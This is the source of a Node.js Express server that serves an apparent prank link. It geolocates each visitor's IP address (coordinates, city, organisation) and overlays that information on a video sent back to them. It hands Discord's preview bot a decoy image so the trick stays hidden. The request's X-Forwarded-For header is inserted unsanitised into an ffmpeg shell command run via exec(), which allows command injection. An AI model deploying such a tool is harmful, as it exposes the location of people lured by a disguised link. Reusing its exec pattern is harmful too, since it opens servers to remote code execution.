import express from 'express';
import { exec } from 'node:child_process';
import { mkdir, writeFile, unlink } from 'node:fs/promises';
import getIPInfo from './IPTools.js';
import { existsSync } from 'node:fs';
const app = express();
const fuckYouDiscord = new Set();
await mkdir('./bin/logs', { recursive: true });
await mkdir('./bin/videos', { recursive: true });
function removeIPFromRateLimit(ip) {
    fuckYouDiscord.delete(ip);
}
async function renderVideo(ip) {
    let data;
    try {
        data = await getIPInfo(ip);
    }
    catch (e) {
        throw e;
    }
    console.log(`ID info for: ${ip}\nLatitude, Longitude: ${data.latitude}, ${data.longitude}\nCountry: ${data.country}\nCity: ${data.city}\nOrganization: ${data.organization}`);
    try {
        await writeFile(`./bin/logs/${ip}.txt`, `${data.latitude}, ${data.longitude}\n${data.country}\n${data.city}\n${data.organization}`);
    }
    catch (e) {
        throw e;
    }
    const command = `ffmpeg -i ./assets/funny.mp4 -vf "drawtext=fontfile=./assets/impact.ttf:textfile=./bin/logs/${ip}.txt:fontcolor=white:fontsize=85:x=(w-text_w)/12:y=(h-text_h)/2" -c:a copy -c:v libx264 -preset veryfast -crf 18 ./bin/videos/${ip}_out.mp4`;
    await new Promise((resolve, reject) => {
        exec(command, (err, stdout, stderr) => {
            if (err) {
                reject(err);
            }
            else {
                console.log(`Video ${ip} rendered successfully!`);
                try {
                    unlink(`./bin/logs/${ip}.txt`).then(resolve);
                }
                catch (e) {
                    reject(e);
                }
            }
        });
    });
}
async function handleRequest(req, res) {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress, startedAt = Date.now();
    if (existsSync(`./bin/videos/${ip}_out.mp4`)) {
        res.sendFile(`./bin/videos/${ip}_out.mp4`, { root: '.' });
        return;
    }
    console.log(req.headers);
    if (fuckYouDiscord.has(ip)) {
        console.log('Rate limit hit for', ip);
        res.status(429).header('Content-Type', 'text/html').send('You are being ratelimited, please wait a bit (You should automatically be removed from being ratelimited after 35 seconds)<br><iframe width="560" height="315" src="https://www.youtube.com/embed/jeg_TJvkSjg?controls=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>');
        return;
    }
    else if (req.headers['user-agent'].includes('Discord')) {
        console.log('Discord detected for', ip);
        res.sendFile('./assets/clickit.png');
        return;
    }
    else {
        console.log('new request from', ip);
        fuckYouDiscord.add(ip);
        setTimeout(() => removeIPFromRateLimit(ip), 35000);
        try {
            await renderVideo(ip);
        }
        catch (e) {
            console.error(e);
            res.status(500).send('Something went wrong, please try again later.');
            return;
        }
        res.setHeader('Content-Type', 'video/mp4');
        res.setHeader('X-Completed-In', `${Date.now() - startedAt}`);
        res.sendFile(`./bin/videos/${ip}_out.mp4`, { root: '.' });
        setTimeout(async () => {
            try {
                await unlink(`./bin/videos/${ip}_out.mp4`);
            }
            catch (e) {
                console.error(e);
            }
        }, 35000);
    }
}
app.get('/', handleRequest);
app.get('walt.mp4', handleRequest);
app.listen(8080, () => console.log('walter is confessing on port 8080'));
//# sourceMappingURL=index.js.map